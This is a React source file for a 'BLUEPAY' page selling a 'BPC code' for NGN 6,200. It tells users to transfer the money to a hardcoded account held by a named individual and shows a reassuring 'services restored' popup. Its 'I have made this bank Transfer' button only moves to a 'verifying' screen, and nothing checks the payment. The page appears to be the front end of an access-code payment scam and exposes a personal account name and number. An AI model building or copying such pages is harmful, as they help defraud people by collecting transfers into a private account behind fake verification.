
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";

const BuyBPCPayment = () => {
  const navigate = useNavigate();
  const [showOpayAlert, setShowOpayAlert] = useState(true);

  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        description: `${type} copied to clipboard!`,
        duration: 2000,
      });
    });
  };

  const handlePaymentConfirm = () => {
    navigate("/buy-bpc/verifying");
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-100 relative">
      {showOpayAlert && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-lg p-4 max-w-sm w-full mx-4 text-center">
            <div className="flex flex-col items-center">
              <img
                src="https://i.ibb.co/qLVCfHVK/icon.jpg"
                alt="Opay Logo"
                className="w-10 h-10 mb-2"
              />
              <h2 className="text-green-600 text-lg font-bold mb-2">
                All Services Restored
              </h2>
              <p className="text-gray-700 mb-2 text-sm">
                All banking services including Opay are now working perfectly.
              </p>
              <div className="bg-green-100 border border-green-400 text-green-700 px-3 py-2 rounded mb-3 text-xs">
                Opay and all other supported banks are now fully operational.
                You can use any bank for your payments.
              </div>
              <Button
                className="bg-blue-600 hover:bg-blue-700 w-full py-2 text-white text-sm"
                onClick={() => setShowOpayAlert(false)}
              >
                I Understand
              </Button>
            </div>
          </div>
        </div>
      )}

      <header className="bg-[#222222] text-white py-3 px-4 flex justify-between items-center sticky top-0 z-10">
        <button className="text-lg">
          <span className="sr-only">Menu</span>
        </button>
        <h1 className="text-xl font-semibold">BLUEPAY</h1>
        <div className="w-6 h-6">
          <span className="sr-only">Notifications</span>
        </div>
      </header>

      <div className="bg-gray-200 py-3 px-4 flex items-center justify-between">
        <div className="flex items-center">
          <button onClick={() => navigate(-1)} className="mr-2">
            <ArrowLeft size={20} />
          </button>
          <h2 className="text-lg font-bold">Bank Transfer</h2>
        </div>
        <button
          onClick={() => navigate(-1)}
          className="text-red-500 font-medium text-sm"
        >
          Cancel
        </button>
      </div>

      <div className="flex flex-col items-center p-4 mb-4">
        <h1 className="text-3xl font-bold mb-1">NGN 6,200</h1>
        <p className="text-gray-600 text-sm">BPC Code Purchase</p>
      </div>

      <div className="bg-blue-50 mx-4 p-3 rounded-lg">
        <h3 className="text-blue-700 text-base font-semibold mb-2">
          Instructions:
        </h3>
        <ol className="list-decimal pl-4 text-blue-700 space-y-1 text-sm">
          <li>Copy the account details below</li>
          <li>Open your bank app and make a transfer</li>
          <li>Return here and click "I have made this bank Transfer"</li>
          <li>Wait for confirmation (usually within 3 minutes)</li>
        </ol>
      </div>

      <div className="bg-white m-4 p-3 rounded-lg border border-gray-200">
        <div className="mb-3">
          <p className="text-gray-500 text-xs">Amount</p>
          <div className="flex justify-between items-center">
            <p className="text-lg font-bold">NGN 6200</p>
            <Button
              variant="default"
              size="sm"
              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1"
              onClick={() => handleCopy("6200", "Amount")}
            >
              <Copy size={14} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-3 border-t pt-3">
          <p className="text-gray-500 text-xs">Account Number</p>
          <div className="flex justify-between items-center">
            <p className="text-lg font-bold">8105415222</p>
            <Button
              variant="default"
              size="sm"
              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-1"
              onClick={() => handleCopy("8105415222", "Account Number")}
            >
              <Copy size={14} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-3 border-t pt-3">
          <p className="text-gray-500 text-xs">Bank Name</p>
          <p className="text-lg font-bold">Moniepoint MFB</p>
        </div>

        <div className="mb-3 border-t pt-3">
          <p className="text-gray-500 text-xs">Account Name</p>
          <p className="text-lg font-bold">SAMUEL KELLY</p>
        </div>
      </div>

      <p className="text-center px-4 mb-3 text-gray-700 text-sm">
        Pay to this specific account and get your BPC code
      </p>

      <div className="px-4 mb-6">
        <Button
          className="bg-blue-600 hover:bg-blue-700 w-full py-4 text-base font-semibold"
          onClick={handlePaymentConfirm}
        >
          I have made this bank Transfer
        </Button>
      </div>
    </div>
  );
};

export default BuyBPCPayment;
